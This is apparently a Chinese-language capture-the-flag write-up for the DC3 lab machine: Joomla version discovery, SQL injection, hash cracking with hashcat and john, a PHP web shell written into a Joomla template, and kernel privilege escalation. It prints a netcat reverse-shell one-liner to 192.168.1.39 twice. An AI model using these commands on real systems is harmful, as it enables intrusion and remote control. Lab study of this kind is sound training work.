# DC3  
## 简述  
查找到joomla的版本，发现漏洞，在joomla模板文件当中写webshell，最后连接webshell使用内核漏洞进行提权  
```
https://www.tunnelsup.com/hash-analyzer/ 
hashcat -m 3200 pas.txt /usr/share/wordlists/rockyou.txt  --force --show (-m 指定种类 )  
```

## 发现版本和漏洞
### 扫描主机和开启的服务  
```
nmap 192.168.1.*扫描ip段  
nmap -A ip -p 1-65535 对一个ip地址进行全面的扫描并且扫描开启的端口  
```  
![20211017000447](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000447.png)  
![20211017000500](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000500.png)
发现只开启了80端口  
目录爆破
```
python3 dirsearch.py -e php -u 
```
访问其中的页面发现是joomla
![20211017000516](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000516.png)
![20211017000531](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211017000531.png)
或者是使用joomscan直接进行搜索（比较推荐使用这个插件直接能拿到版本号   
```
perl joomscan.pl -u http://192.168.1.60
```

![20191127195336.png](https://i.loli.net/2019/11/27/9wHT1rkBovUM5lL.png)  
然后在其中的版本当中使用**searchsploit**进行搜素历史漏洞   
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201150257.png)  
看其中的payload比较麻烦，直接在网上找了一个payload()
![20191124113526.png](https://i.loli.net/2019/11/24/7LBviDErnpVFuze.png)  
搜索漏洞利用可以直接在这里面看到利用或者是验证的过程（或者是exploit-db）  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201203928.png)
可以使用该sql漏洞拿到用户名和加密的密码，其中密码可以使用john进行破解  
hashcat 的使用方法  
```
hashcat -m 3200 pas.txt /usr/share/wordlists/rockyou.txt --show  
```  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201205319.png)  
john的使用方式   
```
john  pas.txt /usr/share/wordlists/rockyou.txt --show  
```  
hashcat和john都存在这个问题如果不加上show参数的话，之前爆破的结果不会保存  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201205710.png)
## 漏洞利用  
###  写webshell  
joomla模板的webshell这么写  
```
访问administrator页面->Extensions->styles->点击Template下的进行编辑php文件  
如何进行反弹？直接访问ip/templates/tem_name/页面就可以了  

```
因为是php建站模板，可以直接使用在template当中进行新建php文件进行  ![20191124114230.png](https://i.loli.net/2019/11/24/f8YR4SQK6oV7Wuj.png)
``` 
<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.39 1337 >/tmp/f');
?>  （直接反弹shell的方式不能使用 （nc ip port）的方式  
```
**一句话反弹shell**  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201211647.png)  
接受到返回的shell  
![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201211752.png)
## 提权   
```
python -c 'import pty;pty.spawn("/bin/bash")'  
```
提权还是使用searchsploit进行提权  ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201211948.png)
![20191124114749.png](https://i.loli.net/2019/11/24/SvZ8Xe5ICtLJpsu.png)   
kali上![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201212509.png)  
靶机上  ![](https://raw.githubusercontent.com/shakeyin1998/picsformd/master/20200201212931.png)
## 总结  
常见cms的sql注入，拿到网站权限，写一个shell，反弹之后内核进行提权
### 操作  
一句话反弹shell  <?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.39 1337 >/tmp/f');
?>   
爆破密码  john  pas.txt /usr/share/wordlists/rockyou.txt --show  
hashcat -m 3200 pas.txt /usr/share/wordlists/rockyou.txt --show  
### 注意点  
这里使用php反弹shell的脚本和之前的不同需要注意  
在shell当中不存在解压命令 所以最好是使用逐个文件进行上传（msf直接上传，冰蝎上传），编译之后就行了 ，当然这里存在                    


